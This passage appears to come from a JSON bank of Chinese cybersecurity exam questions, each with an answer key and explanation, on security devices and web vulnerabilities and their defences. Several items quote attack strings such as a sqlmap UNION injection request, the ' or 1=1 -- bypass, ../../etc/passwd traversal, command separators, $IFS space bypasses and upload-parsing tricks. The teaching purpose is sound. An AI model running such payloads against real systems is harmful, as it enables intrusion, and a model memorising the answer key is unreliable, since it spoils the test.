）。","o":["旁路只镜像分析流量、故障不影响业务但无法阻断；串接在流量路径上可阻断但引入风险","没有区别","旁路能阻断","串接不产生延迟"],"a":0,"e":"\u003cb>旁路（如IDS、审计系统）通过镜像口复制流量分析，\u003cb>只告警不阻断\u003c/b>，故障不影响业务；\u003cb>串接\u003c/b>（如IPS、WAF、防火墙）在流量路径中，\u003cb>可实时阻断\u003c/b>但引入延迟，故障/误报可能影响业务\u003c/b>。\u003cb>易错点\u003c/b>：'要拦就串接，只记就旁路'。\u003cb>记忆\u003c/b>：'串接=收费站（能拦会堵），旁路=路边摄像头（只看不拦）'。"},{"c":"device","t":"s","q":"等保2.0'一个中心、三重防护'中的'一个中心'是指（　）。","o":["安全管理中心（态势感知/安全运营中心）","核心机房","运维中心","网络中心"],"a":0,"e":"\u003cb>等保2.0核心架构：\u003cb>'一个中心'=安全管理中心\u003c/b>，'三重防护'=安全计算环境、安全区域边界、安全通信网络\u003c/b>，安全管理中心统一管理审计、管控、集中监测。\u003cb>易错点\u003c/b>：'中心=安全管理（集中管控审计）'。\u003cb>记忆\u003c/b>：'一中心管全局，三防护守层级'。"},{"c":"device","t":"s","q":"关于防火墙高可用（HA）部署，下列说法正确的是（　）。","o":["主备/双机热备，主设备故障自动切换，避免单点故障导致断网","只有单台设备","不需要冗余","HA不检查状态"],"a":0,"e":"\u003cb>防火墙/IPS等关键串接设备应做\u003cb>HA高可用（主备或负载分担）\u003c/b>，主设备故障时自动切换，配合链路bypass降低单点故障风险\u003c/b>。\u003cb>易错点\u003c/b>：'串接设备必须考虑冗余，否则设备一挂全网瘫'。\u003cb>记忆\u003c/b>：'关键路口要配副班，主班倒下副班顶上'。"},{"c":"device","t":"s","q":"漏洞管理平台（如主机漏洞扫描+修复闭环）的核心流程是（　）。","o":["发现（扫描）→评估（风险定级）→修复（补丁/加固）→复测与跟踪","只扫描不修复","只修不打补丁","手工记录"],"a":0,"e":"\u003cb>漏洞管理闭环：\u003cb>资产发现→漏洞扫描→风险评估定级（CVSS/业务影响）→修复（补丁/配置/缓解）→复测验证→持续跟踪\u003c/b>\u003c/b>，是等保与安全运营的基础工作。\u003cb>易错点\u003c/b>：'扫描只是开始，修复+复测才闭环'。\u003cb>记忆\u003c/b>：'扫、评、修、验四步循环'。"},{"c":"device","t":"m","q":"下列属于防火墙主要功能的有（　）。","o":["访问控制（按策略放行/阻断流量）","隔离不同安全区域（如内网与外网）","记录网络访问日志","直接查杀主机内的病毒文件"],"a":[0,1,2],"e":"防火墙部署在网络边界，负责\u003cb>访问控制、安全区域隔离与日志审计\u003c/b>；\u003cb>查杀主机病毒是杀毒软件/终端防护（EDR）的职责\u003c/b>，防火墙不做主机杀毒。\u003cb>易错点\u003c/b>：防火墙≠杀毒软件，一个管网络边界、一个管主机文件。"},{"c":"device","t":"s","q":"下列关于 APT（高级持续性威胁）的说法，错误的是（　）。","o":["APT 通常随机大规模撒网，以感染数量最大化为目标","APT 攻击链长，常包含侦察、钓鱼投递、驻留、横向移动、数据外传等阶段","APT 常使用定制木马、0day/Nday 漏洞并长期潜伏","威胁情报与流量回溯是发现 APT 的重要手段"],"a":0,"e":"\u003cb>APT 的'高级'体现在：针对特定目标定向攻击、长期潜伏、多阶段作战、定制化工具\u003c/b>，目标是窃密或破坏而非感染数量。随机撒网、以量取胜是普通蠕虫与僵尸网络的特征。\u003cb>易错点\u003c/b>：反向题要圈出'随机、大规模、数量最大化'等关键词。\u003cb>记忆\u003c/b>：'APT 是狙击枪，蠕虫是散弹枪'。"},{"c":"device","t":"s","q":"与防火墙相比，安全隔离网闸（GAP）的典型特征是（　）。","o":["在链路层物理断开的基础上，通过专用硬件摆渡数据，连接非实时，适用于高安全等级网络间的数据交换","与防火墙工作方式完全相同，只是叫法不同","可以替代防病毒软件查杀文件病毒","部署后网络自动变成无线架构"],"a":0,"e":"\u003cb>网闸 = 物理断开 + 专用摆渡硬件 + 协议落地重组\u003c/b>，无 TCP 连接直通、非实时交换，可阻断基于网络连接的攻击直达内网；防火墙是逻辑隔离、按规则转发。\u003cb>易错点\u003c/b>：网闸不检测数据内容中的恶意代码（常需与防病毒模块配合），且实时性差、应用支持有限是其局限。\u003cb>记忆\u003c/b>：'防火墙是门卫，网闸是摆渡船'。"},{"c":"device","t":"s","q":"关于蜜罐（Honeypot）的部署与价值，说法正确的是（　）。","o":["在 DMZ 或内网关键路径旁伪装成真实资产，用于诱捕拖延攻击并采集行为，为检测与溯源提供情报","可替代防火墙拦截外部攻击","应填入真实业务数据以增强吸引力","只能部署在互联网边界，内网没有价值"],"a":0,"e":"\u003cb>蜜罐是'假目标、真情报'\u003c/b>：与业务无关的任何访问都高度可疑，误报率极低；高交互蜜罐采集信息多但风险高，必须严格隔离与监控。\u003cb>易错点\u003c/b>：蜜罐不负责拦截（那是 IPS）；放真实数据会反向泄漏；\u003cb>内网蜜罐专抓已突破边界者，价值更大\u003c/b>。\u003cb>记忆\u003c/b>：'内网碰蜜罐 = 已经进屋了'。"},{"c":"device","t":"m","q":"构建针对 APT 的防御体系，下列措施有效的有（　）。","o":["接入威胁情报，对 C2 域名、IP、样本哈希进行匹配告警","部署沙箱，对邮件附件与下载文件做动态行为检测","终端部署 EDR，监控异常进程链与横向移动行为","仅依靠边界防火墙封禁 80/443 以外的端口即可高枕无忧"],"a":[0,1,2],"e":"\u003cb>APT 防御 = 威胁情报（已知 IoC）+ 沙箱（未知样本行为 detonation）+ EDR（进程链与横移）+ 流量回溯 + 人员意识\u003c/b>，多层叠加缺一不可。APT 常借 80/443 等合法协议与域名外传数据，\u003cb>只封端口远远不够\u003c/b>。\u003cb>记忆\u003c/b>：'APT 走正门协议，防它不能只看门'。"},{"c":"web","t":"s","q":"以下哪个选项不是MySQL中常用的报错注入函数？","o":["floor()","mid()","updatexml()","extractvalue()"],"a":1,"e":"报错注入常用\u003cb>floor()、updatexml()、extractvalue()\u003c/b>等构造错误回显数据；\u003cb>mid()是字符串截取函数\u003c/b>，不用于报错。"},{"c":"web","t":"s","q":"如果攻击者能够实施对MySQL的SQL注入攻击，以下不属于危险攻击利用方法的是（　）。","o":["BENCHMARK函数","SELECT ... INTO OUTFILE语句","magic_quotes_gpc=On","UNION SELECT语句"],"a":2,"e":"\u003cb>magic_quotes_gpc=On是防护配置\u003c/b>（自动转义引号），不是攻击手段；BENCHMARK可用于延时盲注，INTO OUTFILE可写webshell，UNION SELECT用于联合查询脱库。"},{"c":"web","t":"s","q":"以下哪个不是正确的SQL注入过滤绕过方法？","o":["sleep被过滤时使用benchmark()绕过","空格被过滤时使用%0a、/**/、括号绕过","or、and被过滤时使用&amp;&amp;、||绕过","&gt;被过滤时使用greater()绕过"],"a":3,"e":"&gt;被过滤时可用\u003cb>greatest()/least()、between、like\u003c/b>等替代；MySQL中不存在\u003cb>greater()\u003c/b>函数，故D错误。"},{"c":"web","t":"s","q":"以下哪个不是PHP中常出现代码执行漏洞的函数？","o":["eval()","usort()","assert()","system()"],"a":3,"e":"eval、usort（回调参数）、assert可导致\u003cb>代码执行\u003c/b>；\u003cb>system()属于命令执行函数\u003c/b>（exec、shell_exec等同理）。"},{"c":"web","t":"s","q":"以下哪个不能用于命令执行漏洞中的空格绕过？","o":["$IFS$3","$IPC","${IFS}","0x09（Tab）"],"a":1,"e":"空格绕过可用\u003cb>$IFS、${IFS}、$IFS$9、Tab(%09)等\u003c/b>；\u003cb>$IPC不存在\u003c/b>，是干扰项。"},{"c":"web","t":"s","q":"远程文件包含（RFI）漏洞需要以下哪项PHP配置的支持？","o":["allow_url_fopen=Off","allow_fopen=On","allow_url_include=On","allow_include=On"],"a":2,"e":"远程文件包含要求\u003cb>allow_url_include=On\u003c/b>（配合allow_url_fopen=On）；生产环境应两者关闭。"},{"c":"web","t":"s","q":"进行Struts2-057漏洞测试时，构造的攻击载荷（如 \u003ccode>${1+1}\u003c/code>）是什么表达式？","o":["EL表达式","OGNL表达式","Cron表达式","正则表达式"],"a":1,"e":"Struts2系列漏洞的核心是\u003cb>OGNL表达式注入\u003c/b>，${1+1}被执行即验证存在表达式注入。"},{"c":"web","t":"s","q":"PHP的preg_replace函数中，正则匹配参数存在以下哪个修饰符时可能出现代码执行漏洞？","o":["i","c","e","d"],"a":2,"e":"\u003cb>/e修饰符\u003c/b>会将匹配结果作为PHP代码eval执行（PHP 5.5起废弃），存在代码执行风险。i是忽略大小写，无此问题。"},{"c":"web","t":"s","q":"Web服务器日志中发现如下请求：\u003ccode class='block'>username=LxBV' UNION ALL SELECT NULL,CONCAT(0x7178766b71,IFNULL(CAST(DATABASE() AS CHAR),0x20),0x71626b7871),NULL,NULL-- -&amp;password=xcOn\u003c/code>该请求最可能属于哪种攻击？","o":["反射型XSS","UNION联合查询SQL注入（sqlmap特征）","目录遍历攻击","CSRF攻击"],"a":1,"e":"载荷使用\u003cb>UNION ALL SELECT+CONCAT+DATABASE()\u003c/b>提取当前数据库名，十六进制串0x7178766b71等是\u003cb>sqlmap的标记特征\u003c/b>，属于UNION联合查询注入。"},{"c":"web","t":"s","q":"防御SQL注入最有效的措施是（　）。","o":["拼接SQL前过滤单引号","使用预编译（参数化）查询","隐藏报错信息","限制请求频率"],"a":1,"e":"\u003cb>预编译将SQL结构与用户数据分离\u003c/b>，数据不会被当作代码执行，是防注入的根本手段；过滤与隐藏报错只是辅助缓解。"},{"c":"web","t":"s","q":"防御XSS跨站脚本攻击最核心的措施是（　）。","o":["对输出到页面的数据进行HTML编码/转义","使用HTTPS","增加口令复杂度","安装杀毒软件"],"a":0,"e":"XSS的本质是用户数据被浏览器当作脚本执行，\u003cb>输出编码/转义\u003c/b>（配合CSP）是核心防御手段；HTTPS不能防XSS。"},{"c":"web","t":"f","q":"PHP配置magic_quotes_gpc=On开启后会对GET/POST/Cookie中的引号自动转义，可在一定程度上缓解SQL注入。","a":0,"e":"\u003cb>正确。\u003c/b>magic_quotes_gpc=On 会对GET/POST/Cookie数据中的\u003cb>单双引号、反斜杠自动转义\u003c/b>，一定程度上缓解字符型SQL注入。\u003cb>但该机制已废弃\u003c/b>：PHP 5.4起默认移除、5.6彻底移除，因为转义不完整（可编码绕过）、依赖全局配置、有性能开销，现代开发必须使用\u003cb>参数化查询（预编译）\u003c/b>而非字符串拼接+转义。\u003cb>记忆\u003c/b>：'转义是旧方案，参数化是新方案'。"},{"c":"web","t":"s","q":"SQL注入漏洞的根本原因是（　）。","o":["用户输入被拼接进SQL语句并当作代码执行","数据库端口暴露","使用HTTPS","防火墙策略太严"],"a":0,"e":"根本原因是\u003cb>数据与代码未分离\u003c/b>：用户输入直接拼进SQL被执行。根治手段是预编译参数化查询；辅以最小权限数据库账号、屏蔽报错、WAF等多层防御。"},{"c":"web","t":"s","q":"SQL盲注的特点是（　）。","o":["页面无数据回显，通过真假差异或延时逐位推断","只能读取图片","必须管理员权限","注入后页面直接显示数据库内容"],"a":0,"e":"盲注分\u003cb>布尔盲注\u003c/b>（依据页面/长度差异判断真假）与\u003cb>时间盲注\u003c/b>（用sleep按响应时间推断）。速度慢但危害不减；日志中大量规律性异常参数是识别线索。"},{"c":"web","t":"s","q":"sqlmap工具的定位是（　）。","o":["自动化SQL注入检测与利用工具","Web应用防火墙","日志审计平台","抓包代理工具"],"a":0,"e":"sqlmap支持-u指定目标、--dbs枚举数据库、--batch全自动模式，广泛用于\u003cb>授权的渗透测试与自检\u003c/b>。未经授权对他人系统使用是违法行为——工具无罪，用法有界。"},{"c":"web","t":"s","q":"下列不属于XSS跨站脚本类型的是（　）。","o":["存储型XSS","反射型XSS","DOM型XSS","加密型XSS"],"a":3,"e":"XSS三种类型：\u003cb>存储型\u003c/b>（恶意脚本入库，影响所有访问者）、\u003cb>反射型\u003c/b>（URL参数即时回显）、\u003cb>DOM型\u003c/b>（前端JS处理不当）。没有“加密型”XSS。防御：输出编码＋HttpOnly＋CSP。"},{"c":"web","t":"s","q":"危害最大的XSS类型是（　）。","o":["存储型XSS","反射型XSS","DOM型XSS","三者完全一样"],"a":0,"e":"\u003cb>存储型XSS\u003c/b>把脚本持久化在服务器（评论、个人资料等），所有浏览该页面的用户都会中招，可盗取会话、形成XSS蠕虫；反射型需逐个诱导点击，影响范围小得多。"},{"c":"web","t":"s","q":"SSRF漏洞指的是（　）。","o":["服务端请求伪造，攻击者借服务器发起内网请求","跨站请求伪造","慢速HTTP攻击","SSL证书伪造"],"a":0,"e":"SSRF常见于“填网址取内容”类功能：可\u003cb>探测内网、读取云元数据\u003c/b>（如169.254.169.254获取密钥）。防御：目标白名单、禁用内网地址段、限制协议与跳转次数。"},{"c":"web","t":"s","q":"下列不属于文件上传漏洞有效防御措施的是（　）。","o":["服务端扩展名白名单","上传文件随机重命名","存储目录禁止执行脚本","仅依靠客户端JS校验"],"a":3,"e":"\u003cb>客户端JS校验可通过直接发包绕过\u003c/b>，只能作为体验优化。有效防御：服务端白名单＋文件类型检测＋随机重命名＋隔离存储＋目录禁止执行＋图片二次渲染。"},{"c":"web","t":"s","q":"文件包含漏洞中LFI与RFI的区别是（　）。","o":["本地包含可读取服务器文件，远程包含可拉取外部恶意代码","LFI只能包含图片","RFI不需要任何配置","两者都只影响静态页面"],"a":0,"e":"LFI包含本地文件（可读/etc/passwd、包含日志getshell）；\u003cb>RFI远程包含需allow_url_include=On\u003c/b>。根治：包含路径白名单写死，绝不将用户输入传入include/require。"},{"c":"web","t":"s","q":"命令执行漏洞与代码执行漏洞的区别是（　）。","o":["命令执行调用操作系统命令，代码执行运行脚本语言代码","两者毫无关系","命令执行只能删除文件","代码执行不影响安全"],"a":0,"e":"PHP中system/exec/passthru属于\u003cb>命令执行\u003c/b>，eval/assert属于\u003cb>代码执行\u003c/b>；两者利用效果常等价（都能写webshell）。防御：禁用危险函数＋参数严格校验＋WAF。"},{"c":"web","t":"s","q":"对越权漏洞的理解，正确的是（　）。","o":["水平越权是同级用户互访数据，垂直越权是低权限访问高权限功能","越权只能通过SQL注入实现","越权是网络层问题","浏览器开发者工具无法利用越权"],"a":0,"e":"攻击者\u003cb>修改请求中的id/user_id\u003c/b>即可查看他人订单（水平）；普通用户直接请求管理接口（垂直）。防御：服务端会话鉴权＋\u003cb>资源属主校验\u003c/b>＋接口默认拒绝＋敏感操作审计。"},{"c":"web","t":"s","q":"浏览器的同源策略要求（　）完全一致。","o":["协议、域名、端口","域名、IP、MAC","用户、口令、权限","HTTP方法、URL、Cookie"],"a":0,"e":"\u003cb>协议＋域名＋端口三者相同才同源\u003c/b>，浏览器禁止脚本跨源读取响应，是Web安全基石；跨域需CORS白声明。注意区分：XSS是同源内的代码注入，CSRF是跨站携带Cookie的滥用。"},{"c":"web","t":"f","q":"只要过滤了单引号，就能完全杜绝SQL注入。","a":1,"e":"错误。\u003cb>数字型注入、宽字节注入、Hex/Char编码绕过\u003c/b>等都不需要单引号。过滤黑名单永远在追赶绕过手法，根治方案是\u003cb>预编译参数化查询\u003c/b>让数据永远只是数据。"},{"c":"web","t":"s","q":"恶意脚本被提交并存入数据库，其他用户浏览相关页面时自动执行的XSS类型是（　）。","o":["存储型XSS","反射型XSS","DOM型XSS","CSRF"],"a":0,"e":"\u003cb>存储型XSS入库后危害面最大\u003c/b>（留言板、个人资料等）；反射型需诱骗点击带参链接；\u003cb>DOM型完全由前端JS处理location等输入触发，服务端日志看不到payload\u003c/b>。防御核心：按输出上下文编码+框架默认转义+CSP。"},{"c":"web","t":"s","q":"XSS攻击最典型的直接危害是（　）。","o":["窃取Cookie进行会话劫持","直接格式化服务器磁盘","修改DNS解析","物理损坏网卡"],"a":0,"e":"\u003cb>一段document.cookie外带脚本即可冒充受害者会话\u003c/b>（HttpOnly可阻止脚本读取Cookie缓解）；此外还可键盘记录、伪造页面钓鱼、XSS蠕虫、内网探测。XSS常作为攻击链的落脚点。"},{"c":"web","t":"s","q":"CSRF攻击的原理是（　）。","o":["向页面注入恶意脚本","利用浏览器自动携带Cookie，诱导已登录用户在不知情下发起请求","穷举用户口令","伪造ARP报文"],"a":1,"e":"\u003cb>CSRF=借用户已登录的身份发请求\u003c/b>，攻击者虽看不到响应，但“借手”完成转账/改密等操作。防御：Anti-CSRF Token（服务端校验）、SameSite Cookie、Referer/Origin校验、敏感操作二次验证。与XSS的区别：XSS是注脚本，CSRF是借身份。"},{"c":"web","t":"s","q":"普通用户通过修改URL中的id参数查看他人订单，属于（　）。","o":["水平越权","垂直越权","SQL注入","目录遍历"],"a":0,"e":"\u003cb>水平越权=同级用户之间互看互改\u003c/b>（改id）；\u003cb>垂直越权=低权限用户调用高权限接口\u003c/b>（改路径/隐藏参数）。根因是服务端只验证了身份未验证资源归属。防御：归属从服务端会话取值、接口级鉴权、默认拒绝。"},{"c":"web","t":"s","q":"使服务器代替攻击者访问内网地址（如Redis、云元数据接口）的漏洞是（　）。","o":["SSRF","XSS","CORS配置不当","文件包含"],"a":0,"e":"\u003cb>SSRF（服务端请求伪造）\u003c/b>：输入的URL被服务端请求（图片抓取、Webhook等功能点），可探测内网端口、file://读文件、攻击内网Redis或云元数据（169.254.169.254）。防御：URL白名单、禁内网与伪协议、重定向前二次校验。"},{"c":"web","t":"s","q":"文件上传校验中，相对更安全的做法是（　）。","o":["黑名单禁止asp/php/jsp扩展名","白名单只允许jpg/png等，并随机改名、存储目录禁止执行","只校验Content-Type","只在前端JS校验扩展名"],"a":1,"e":"\u003cb>黑名单永远列不全\u003c/b>（大小写、双扩展、解析漏洞、新类型不断绕过）；\u003cb>白名单默认拒绝更安全\u003c/b>。纵深防御：文件头校验、随机重命名、独立存储域/目录无执行权限、大小限制。前端校验改包即绕。"},{"c":"web","t":"s","q":"下列不属于常见文件上传绕过手段的是（　）。","o":["修改 Burp/ BurpSuite 抓包绕过前端JS校验","黑名单下利用大小写、双扩展名、%00截断（旧版PHP）绕过","上传.htaccess使图片按PHP解析","修改服务器防火墙策略放行上传"],"a":3,"e":"A/B/C均为经典绕过思路，\u003cb>D不是绕过手段\u003c/b>（攻击者一般也改不了防火墙）。对应防御：服务端扩展名白名单+文件头校验+随机改名+目录无执行权限；%00截断仅影响PHP\u003c5.3.4等旧环境。"},{"c":"web","t":"s","q":"本地文件包含（LFI）漏洞最直接的危害是（　）。","o":["读取任意文件（源码、配置含数据库口令）","直接关机","篡改DNS","物理偷走硬盘"],"a":0,"e":"参数被include/require直接包含时，\u003cb>../../../../etc/passwd即可读取任意文件\u003c/b>，配置文件泄露后数据库随之失守；配合日志投毒、Session文件可升级为RCE。防御：白名单映射页面、过滤../与绝对路径、关闭远程包含（RFI需allow_url_include=On）。"},{"c":"web","t":"s","q":"XML解析器解析外部实体导致读取服务器文件，该漏洞是（　）。","o":["XXE","XSS","SSRF","CRLF注入"],"a":0,"e":"\u003cb>XXE（XML外部实体注入）\u003c/b>：DOCTYPE中ENTITY SYSTEM file://读文件、http://发起SSRF。防御：解析器禁用DTD与外部实体（libxml2新版默认禁用）、不接受用户输入的XML模板、能用JSON就不用XML。"},{"c":"web","t":"s","q":"Java应用中，对不可信数据执行反序列化可能导致的后果是（　）。","o":["仅内存占用升高","构造恶意对象链触发任意代码执行","网页乱码","图片无法显示"],"a":1,"e":"\u003cb>反序列化漏洞：还原对象时自动触发的方法链（如Commons Collections gadget、Shiro rememberMe默认密钥、Fastjson autoType）可导致RCE\u003c/b>。防御：不反序列化不可信数据、类白名单过滤（JEP290）、Shiro密钥随机化、组件升级。"},{"c":"web","t":"s","q":"前端价格被篡改为0元完成下单，这类问题属于（　）。","o":["逻辑漏洞","SQL注入","XSS","越权访问控制"],"a":0,"e":"\u003cb>逻辑漏洞：请求“长得正常”，业务规则被绕过\u003c/b>（金额篡改、负数数量、验证码回显、短信轰炸、并发超发），WAF特征难以发现。防御：服务端强制重算价格、下单原子性、验证码后端校验且限时限量、关键操作幂等并留审计。"},{"c":"web","t":"s","q":"攻击者输入“../../etc/passwd”读取Web根目录之外的文件，属于（　）。","o":["目录遍历","命令注入","CSRF","点击劫持"],"a":0,"e":"\u003cb>目录遍历（路径穿越）\u003c/b>：未过滤../导致跳出Web根读取系统文件（Windows下为..\\..）。与文件包含的区别：遍历只是“读”，包含会把文件“当代码执行”。防御：参数映射为ID、过滤路径穿越序列、最小权限运行。"},{"c":"web","t":"s","q":"下列用于命令注入的命令分隔/拼接符是（　）。","o":["@",";、|、||、&amp;&amp;","#","::"],"a":1,"e":"输入被拼入system()/exec()等函数时，\u003cb>;、|、||、&amp;&amp;、反引号\u003c/b>可追加执行额外命令。防御：参数化调用（数组传参）、escapeshellarg转义、白名单校验、不把用户输入交给shell。"},{"c":"web","t":"s","q":"万能密码 ' or 1=1 -- 的原理是（　）。","o":["加密口令","闭合引号构造恒真条件使WHERE始终成立，并注释掉口令部分","提升数据库权限","绕过防火墙"],"a":1,"e":"拼接后SQL变为\u003cb>恒真条件\u003c/b>并注释掉后续口令校验，返回首条记录即登录成功。根治：预编译参数化查询；口令应单独加盐哈希比对而非拼进SQL查询。' --与#是不同数据库的注释符。"},{"c":"web","t":"s","q":"sqlmap中，从Burp Suite导出的请求文件加载测试目标的参数是（　）。","o":["-u req.txt","--data req.txt","-r req.txt","--cookie req.txt"],"a":2,"e":"\u003cb>-r从完整HTTP请求文件（含Cookie、POST体）直接测\u003c/b>，避免手工拼参；-u指定GET目标，--data指定POST参数；配合--batch自动应答、--level/--risk扩大注入点与payload面、--tamper加载绕WAF脚本。\u003cb>仅限授权测试\u003c/b>。"},{"c":"web","t":"s","q":"Burp Suite中用于参数枚举与爆破的模块是（　）。","o":["Proxy","Repeater","Intruder","Decoder"],"a":2,"e":"\u003cb>Proxy拦截改包、Repeater手工重放（验证越权/注入）、Intruder爆破枚举（sniper/battering ram/pitchfork/cluster bomb四种模式）、Decoder编解码、Comparer差异比对\u003c/b>。抓HTTPS需导入Burp证书。"},{"c":"web","t":"s","q":"IIS 6.0将“shell.asp;.jpg”按什么方式解析（　）。","o":["按jpg图片解析","按asp脚本解析","拒绝解析","按文本解析"],"a":1,"e":"\u003cb>IIS 6.0分号解析漏洞：遇到“;”截断，按asp执行\u003c/b>；另有目录解析漏洞（/xx.asp/1.jpg）。同类：Apache多后缀在AddHandler配置下从右向左识别（x.php.owf.jpg按php执行）；Nginx配合php-fpm及cgi.fix_pathinfo时/1.jpg/x.php被解析。修复：升级、规范上传、关闭非常规解析。"},{"c":"web","t":"s","q":"攻击者用透明iframe覆盖页面诱导用户点击，这类攻击是（　）。","o":["点击劫持（Clickjacking）","DNS劫持","会话固定","URL跳转"],"a":0,"e":"\u003cb>点击劫持：恶意页面透明内嵌目标站点，诱骗用户“点到”目标操作\u003c/b>。防御：X-Frame-Options: DENY/SAMEORIGIN或CSP frame-ancestors禁止被任意内嵌，敏感操作增加二次确认。"},{"c":"web","t":"s","q":"限制页面只能加载本站脚本资源的安全响应头是（　）。","o":["Content-Security-Policy","X-Powered-By","Set-Cookie","Server"],"a":0,"e":"\u003cb>CSP（Content-Security-Policy，如default-src 'self'）是XSS纵深防御核心\u003c/b>；配套：HSTS强制HTTPS防降级剥离、X-Frame-Options防点击劫持、X-Content-Type-Options: nosniff防MIME嗅探。可在网关/Nginx统一下发。"},{"c":"web","t":"s","q":"下列不属于暴力破解有效防御措施的是（　）。","o":["登录失败N次锁定账户","图形/行为验证码且服务端校验","限制单IP请求频率","登录失败时提示“用户名不存在”"],"a":3,"e":"\u003cb>明确的失败原因提示反而帮助攻击者枚举有效用户名\u003c/b>，应统一返回“用户名或密码错误”。有效的防爆破组合：失败锁定+服务端校验的一次性验证码+账号与IP双维度限流+强口令策略+双因素认证。"},{"c":"web","t":"s","q":"REST API中最常见的认证方式是（　）。","o":["Session Cookie","Bearer Token（如JWT放在Authorization头中）","HTML表单","图形验证码"],"a":1,"e":"\u003cb>REST API是无状态的，不适合Session机制，常用Bearer Token认证\u003c/b>：客户端在HTTP Authorization头发送Bearer + Token。JWT是最常见的Token格式。API安全还需注意：HTTPS传输、请求签名防篡改、限流防暴力、输入验证、响应不过度暴露信息。"},{"c":"web","t":"s","q":"CORS（跨源资源共享）配置不当的安全风险是（　）。","o":["加速页面加载","允许恶意网站代替用户向目标API发起请求并读取敏感数据","防止XSS攻击","增强密码强度"],"a":1,"e":"\u003cb>CORS Access-Control-Allow-Origin: * 或动态反射Origin\u003c/b>时，任何网站都能用用户Cookie/Token向目标API请求并读取响应数据（跨域读取敏感接口）。防御：严格指定允许的Origin白名单、不反射任意Origin、敏感接口不用GET方法、配合SameSite Cookie。"},{"c":"web","t":"s","q":"HTTP Strict Transport Security（HSTS）的作用是（　）。","o":["加密Cookie","强制浏览器只能通过HTTPS访问站点，防止SSL剥离攻击","阻止XSS","防止SQL注入"],"a":1,"e":"\u003cb>HSTS通过响应头Strict-Transport-Security: max-age=31536000; includeSubDomains告知浏览器\u003c/b>，在max-age时间内只能用HTTPS访问，即使用户输入http://也会被浏览器自动升级为https://，防止中间人SSL剥离攻击降级为HTTP。注意：首次HTTP访问未被HSTS保护（HSTS Preload List可解决）。"},{"c":"web","t":"s","q":"OWASP Top 10（2021版）排名第一的风险是（　）。","o":["注入","失效的访问控制（Broken Access Control）","安全配置错误","XSS"],"a":1,"e":"\u003cb>2021版OWASP Top 10首位：Broken Access Control（失效的访问控制）\u003c/b>，取代了2017版的注入。访问控制失效包括：越权（水平/垂直）、IDOR、权限提升、配置错误导致管理接口暴露等。95%的应用都存在某种形式的访问控制缺陷。"},{"c":"web","t":"s","q":"JWT令牌被篡改后，服务端应通过以下哪项机制检测？（　）","o":["检查Token长度","验证签名（使用服务端密钥重新计算签名并比对）","检查Token大小写","检查Token是否包含特定字符"],"a":1,"e":"\u003cb>JWT签名部分使用HMAC或RSA对Header+Payload计算签名\u003c/b>，篡改后签名不再匹配，服务端验证失败即拒绝。常见JWT漏洞：none算法攻击（去掉签名部分）、算法篡改（将RS256改为HS256，用公钥当HMAC密钥）、弱密钥暴力破解。"},{"c":"web","t":"s","q":"GraphQL安全与传统REST API相比特有的风险是（　）。","o":["不能传输数据","深度查询（Deep Query）和批量查询（Batching）可能导致DoS或数据泄露","不支持HTTPS","必须使用Cookie"],"a":1,"e":"\u003cb>GraphQL允许客户端自定义查询结构和深度\u003c/b>，攻击者可构造极深嵌套查询或一次请求大量数据导致DoS或全库泄露。防御：查询深度限制、复杂度分析、字段级鉴权、速率限制、禁止Introspection暴露全部Schema信息。GraphQL的安全需在服务端框架层实现。"},{"c":"web","t":"s","q":"浏览器同源策略（Same-Origin Policy）的核心规则是（　）。","o":["所有网页均可互相访问","协议+域名+端口三者完全一致才允许访问对方资源","仅限制JavaScript执行","不影响网络请求"],"a":1,"e":"\u003cb>同源策略限制一个源的文档或脚本如何与另一个源的资源交互\u003c/b>（DOM访问、Cookie读取、AJAX请求等）。CORS是服务端告知浏览器放宽同源限制的机制。同源策略是浏览器安全的基石，XSS/CSRF/CORS滥用都与此策略相关。"},{"c":"web","t":"s","q":"Web应用中验证码（CAPTCHA）的安全作用是（　）。","o":["加密用户输入","区分人类用户与自动化程序（爬虫/暴力破解）","加速页面加载","压缩数据传输"],"a":1,"e":"\u003cb>验证码防止自动化攻击：暴力破解、注册机、垃圾评论、爬虫\u003c/b>。传统图片验证码被OCR破解，趋势是行为验证码（滑块、点击、无感验证）。安全注意：验证码必须在服务端校验（客户端可绕过），且需防验证码服务自身被攻击（大量消耗验证次数）。"},{"c":"web","t":"s","q":"WebSocket连接的安全注意事项不包括（　）。","o":["使用WSS（WebSocket Secure）加密传输","保持连接超时机制","WebSocket不受XSS影响所以无需防护","对连接进行身份认证与授权"],"a":2,"e":"\u003cb>WebSocket同样受XSS影响\u003c/b>：XSS脚本可通过WebSocket向服务端发送恶意消息或接收敏感数据。WebSocket安全：使用wss://加密、连接前认证授权、消息格式校验、速率限制、消息大小限制、CORS/Same-Origin策略、消息内容输入验证。"},{"c":"web","t":"s","q":"Open Redirect漏洞的直接危害是（　）。","o":["窃取数据库数据","攻击者利用可信域名构造跳转链接，将用户引导至钓鱼网站","格式化服务器","物理破坏硬件"],"a":1,"e":"\u003cb>Open Redirect：应用程序接受用户输入的URL参数并执行302跳转\u003c/b>，攻击者构造合法域名的跳转链接（如https://trusted.com/redirect?url=evil.com），用户因看到可信域名而点击后到达钓鱼网站。防御：URL白名单、路径映射（用ID替代URL）、不对用户输入的URL做跳转。"},{"c":"web","t":"s","q":"HTTP响应头X-Content-Type-Options: nosniff的作用是（　）。","o":["阻止Cookie被发送","防止浏览器MIME嗅探，强制按声明的Content-Type处理响应","阻止XSS攻击","加速页面渲染"],"a":1,"e":"\u003cb>nosniff告诉浏览器严格按照服务器声明的Content-Type解析响应\u003c/b>，防止浏览器猜测（MIME Sniffing）将文本文件当成HTML/JS执行。例如上传的图片文件被声明为text/plain但有HTML内容时，浏览器不将其作为HTML渲染，防止存储型XSS。"},{"c":"web","t":"f","q":"CSRF（跨站请求伪造）攻击需要JavaScript在目标网站上执行才能成功。","a":1,"e":"错误。CSRF利用的是浏览器自动携带Cookie的机制，攻击者在第三方网站上诱导用户点击链接或自动提交表单即可，\u003cb>不需要在目标站执行任何JavaScript\u003c/b>。CSRF和XSS的区别正在于此：XSS需要注入脚本到目标站，CSRF借用户已登录的身份发请求。"},{"c":"web","t":"s","q":"存储型XSS与反射型XSS的主要区别是（　